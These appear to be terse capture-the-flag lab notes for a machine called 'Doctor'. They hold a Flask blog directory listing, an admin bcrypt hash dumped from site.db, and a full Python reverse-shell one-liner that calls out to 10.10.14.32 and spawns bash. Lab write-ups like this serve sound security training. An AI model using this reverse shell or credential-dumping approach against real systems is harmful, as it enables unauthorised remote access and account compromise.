# Doctor

## Enumeration

### nmap

/home/web/blog/flaskblog

total 80
-rwxr--r-- 1 web web   302 Sep  5 11:35 config.py
drwxr--r-- 3 web web  4096 Jul 27 20:50 errors
-rwxr--r-- 1 web web   904 Jul 26 14:04 __init__.py
drwxr--r-- 3 web web  4096 Sep 22 11:45 main
-rwxr--r-- 1 web web  1678 Jul 21 20:37 models.py
drwxr--r-- 3 web web  4096 Sep 22 11:33 posts
drwxrwxr-x 2 web web  4096 Sep  5 11:58 __pycache__
-rw-r--r-- 1 web web 36864 Okt 13 07:58 site.db
drwxr--r-- 3 web web  4096 Sep 23 14:45 static
drwxr--r-- 3 web web  4096 Sep 23 14:46 templates
drwxr--r-- 3 web web  4096 Jul 21 20:37 tmp
drwxr--r-- 3 web web  4096 Sep 23 15:15 users

in site.db

1|admin|admin@doctor.htb|default.gif|$2b$12$Tg2b8u/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.32",22473));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'